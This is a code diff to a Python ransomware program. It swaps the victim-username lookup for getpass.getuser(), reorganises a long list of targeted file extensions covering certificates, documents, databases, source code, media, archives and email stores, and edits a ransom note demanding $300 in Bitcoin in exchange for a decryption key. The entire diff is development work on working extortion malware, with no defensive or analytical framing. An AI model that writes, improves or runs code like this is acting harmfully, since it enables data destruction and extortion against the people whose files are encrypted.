@@ -358,7 +358,7 @@ def start_encryption():
         encrypted_key = encrypt_key(bytes(key_b64.encode()))
 
         data = {
-            "username": os.getlogin(),
+            "username": getpass.getuser(),
             "id": str(id),
             "date": datetime.now().strftime("%d-%m-%Y"),
             "key": base64.b64encode(encrypted_key).decode(),
@@ -416,20 +416,31 @@ def start_encryption():
 
 def encrypt_directory(directory_path, key):
     files_targeted = [
-        ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", 
-        ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", 
-        ".ldf", ".sln", ".suo", ".cs", ".c", ".cc", ".cxx", ".cpp", ".pas", ".h", ".hpp", ".asm", ".go", ".kt", ".dart", ".scala", ".r", ".m", ".mm", ".hs", ".fs", ".fsi", ".rs", ".php", ".js", ".cmd", ".bat", 
-        ".ps1", ".vbs", ".vbe", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".pm", ".swift", ".py", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", 
-        ".vob", ".mpeg", ".asf", ".avi", ".lua", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", 
-        ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".paq", ".arc", ".aes", ".gpg", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", 
-        ".snt", ".onetoc2", ".css", ".ts", ".pyw", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", 
-        ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".md", 
-        ".tex", ".odt", ".doc", ".epub", ".mobi", ".fb2", ".azw", ".chm", ".xls", ".xlsx", ".srt", ".sub", ".ass", ".vtt", ".m4a", ".aac", ".flac", ".ogg", ".alac", ".ape", ".wma", ".tiff", ".tif", ".psd", 
-        ".ai", ".eps", ".raw", ".webp", ".heif", ".heic", ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".svg", ".indd", ".ps", ".pdf", ".epub", ".pub", ".odf", ".ods", ".odp", ".ott", ".sxi", ".rtf", ".txt", 
-        ".csv", ".tsv", ".xls", ".xlsx", ".ppt", ".pptx", ".docx", ".dotx", ".dotm", ".dot", ".dotb", ".odt", ".xml", ".json", ".yaml", ".yml", ".ini", ".bat", ".sh", ".cmd", ".ps1", ".vbs", ".pl", ".py", 
-        ".pyw", ".rb", ".php", ".jsp", ".html", ".css", ".scss", ".less", ".xml", ".json", ".yaml", ".ini", ".sql", ".sqlitedb", ".sqlite", ".dbf", ".mdb", ".accdb", ".bak", ".dat", ".cfg", ".ini", ".xml", 
-        ".json", ".sqlite", ".db", ".db3", ".sqlite3", ".ndb", ".csv", ".tsv", ".xlsx", ".xlsb", ".ods", ".psd", ".ai", ".eps", ".cdr", ".3ds", ".obj", ".stl", ".dwg", ".fbx", ".blend", ".gltf", ".usd", 
-        ".dae", ".x3d", ".pdf", ".epub", ".mobi", ".azw3", ".chm", ".xhtml", ".odt", ".docx", ".docm", ".pages", ".rtf", ".txt", ".html", ".xml", ".yaml", ".json", ".csv"
+        ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem",
+        ".odt", ".ott", ".sxw", ".stw", ".uot", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2",
+        ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc",
+        ".pdf", ".rtf", ".csv", ".txt", ".doc", ".docx", ".docm", ".docb", ".dotx", ".dotm", ".dot",
+        ".ppt", ".pptx", ".pptm", ".pot", ".potm", ".potx", ".pps", ".ppsm", ".ppsx", ".ppam",
+        ".xls", ".xlsx", ".xlsb", ".xlsm", ".xlt", ".xltx", ".xltm", ".xlc", ".xlm",
+        ".hwp", ".snt", ".onetoc2", ".pub", ".odf", ".ott", ".indd", ".pages",
+        ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm",
+        ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".edb", ".ndb",
+        ".cs", ".c", ".cc", ".cxx", ".cpp", ".pas", ".h", ".hpp", ".asm", ".go", ".kt", ".dart",
+        ".scala", ".r", ".m", ".mm", ".hs", ".fs", ".fsi", ".rs", ".php", ".js", ".ts", ".py", ".pyw",
+        ".cmd", ".bat", ".ps1", ".vbs", ".vbe", ".vb", ".pl", ".pm", ".jsp", ".asp", ".rb", ".java",
+        ".jar", ".class", ".sh", ".swift", ".scss", ".less", ".html", ".xhtml", ".css",
+        ".mp3", ".wav", ".m4a", ".aac", ".flac", ".ogg", ".alac", ".ape", ".wma", ".mid", ".m3u", ".m4u",
+        ".swf", ".fla", ".wmv", ".mpg", ".mpeg", ".vob", ".asf", ".avi", ".mov", ".mp4",
+        ".3gp", ".mkv", ".3g2", ".flv",
+        ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif",
+        ".png", ".bmp", ".jpg", ".jpeg", ".webp", ".heif", ".heic", ".eps", ".ps",
+        ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".backup", ".tbk", ".bz2", ".paq", ".arc", ".aes", ".gpg",
+        ".dip", ".dch", ".sch", ".brd", ".3ds", ".max", ".3dm", ".dwg", ".cdr", ".obj",
+        ".stl", ".fbx", ".blend", ".gltf", ".usd", ".dae", ".x3d",
+        ".srt", ".sub", ".ass", ".vtt",
+        ".ini", ".cfg", ".dat", ".xml", ".json", ".yaml", ".yml",
+        ".eml", ".msg", ".ost", ".pst",
+        ".602", ".123", ".wk1", ".wks"
     ]
     with ThreadPoolExecutor(max_workers=8) as executor:
         futures = []
@@ -470,7 +481,9 @@ To get them back, please follow the instructions below.
 
 3. Instructions for payment:
 - Buy Bitcoin (BTC) and send $300 to the address: {YOUR_BITCOIN_ADDRESS}
-- After the transaction is confirmed, send an email to {YOUR_EMAIL_ADDRESS} with your ID ({id}) and username.
+- After the transaction is confirmed, send an email to {YOUR_EMAIL_ADDRESS} with your ID and username:
+    + Your ID: {id}
+    + Your username: {getpass.getuser()}
 - Then, you will receive a decryption key to unlock your files.
 
 4. Warning!
